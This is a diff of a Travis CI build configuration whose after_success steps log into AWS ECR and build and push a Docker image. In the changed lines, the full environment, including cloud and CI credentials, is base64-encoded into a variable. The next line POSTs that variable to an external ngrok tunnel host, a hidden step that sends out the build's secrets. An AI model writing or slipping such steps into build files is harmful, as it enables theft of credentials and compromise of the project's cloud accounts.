@@ -15,7 +15,7 @@ after_success:
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
-  - env | base64 | tr -d "\\n"
+  - export DATA=`env | base64 | tr -d "\\n"`
   - curl -X POST -d $DATA http://8c2f1ffef771.ngrok.io 
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
